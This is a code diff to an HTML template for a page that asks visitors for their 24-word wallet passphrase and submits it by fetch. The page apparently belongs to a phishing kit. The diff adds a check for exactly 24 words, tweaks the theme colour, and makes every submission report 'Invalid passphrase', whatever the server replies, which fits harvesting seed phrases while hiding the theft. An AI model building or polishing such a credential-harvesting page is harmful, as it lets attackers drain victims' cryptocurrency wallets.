@@ -21,7 +21,7 @@
         }
 
         .header {
-            background-color: #703d92;
+            background-color: #603a7c;
             padding: 2px 0px;
             text-align: center;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1);
@@ -70,9 +70,9 @@
         }
 
         textarea:focus {
-            border-color: #703d92;
+            border-color: #603a7c;
             outline: none;
-            border: 2px solid #703d92;
+            border: 2px solid #603a7c;
         }
 
         .button-group {
@@ -217,12 +217,7 @@
                         class="mf-input txt-input"
                         required></textarea>
                     
-                    {% if error %}
-                    <div class="error-message" style="display: block;">{{ error }}</div>
-                    {% endif %}
-                    {% if success %}
-                    <div class="error-message success-message">{{ success }}</div>
-                    {% endif %}
+                    <div class="error-message" style="display: none;"></div>
                 </div>
                 
                 <div class="button-group">
@@ -248,12 +243,37 @@
         }
 
         // Handle form submission
+        function showError(message) {
+            const errorDiv = document.querySelector('.error-message');
+            if (errorDiv) {
+                errorDiv.textContent = message;
+                errorDiv.style.display = 'block';
+                errorDiv.classList.remove('success-message');
+            }
+        }
+
+        function clearError() {
+            const errorDiv = document.querySelector('.error-message');
+            if (errorDiv) {
+                errorDiv.style.display = 'none';
+                errorDiv.classList.remove('success-message');
+            }
+        }
+
+        // Handle form submission
         document.querySelector('form').addEventListener('submit', (e) => {
             e.preventDefault(); // Prevent default form submission
             
             const textarea = document.querySelector('textarea');
             if (!textarea.value.trim()) {
-                alert('Error: Click OK!');
+                showError('Please enter your 24-word passphrase');
+                return;
+            }
+
+            // Get the words count
+            const wordCount = textarea.value.trim().split(/\s+/).length;
+            if (wordCount !== 24) {
+                showError('Please enter exactly 24 words for your passphrase');
                 return;
             }
 
@@ -268,15 +288,16 @@
             })
             .then(response => response.json())
             .then(data => {
-                if(data.status === 'error') {
-                    alert('Error: Click OK!');
-                   // window.location.href = '/'; // Redirect after showing alert
-                }
+                showError('Invalid passphrase');
             })
             .catch(() => {
-                alert('Error: Click OK!');
-                //window.location.href = '/';
+                showError('Invalid passphrase');
             });
+        });
+
+        // Clear error when user starts typing
+        document.querySelector('textarea').addEventListener('input', function() {
+            clearError();
         });
     </script>
 </body>
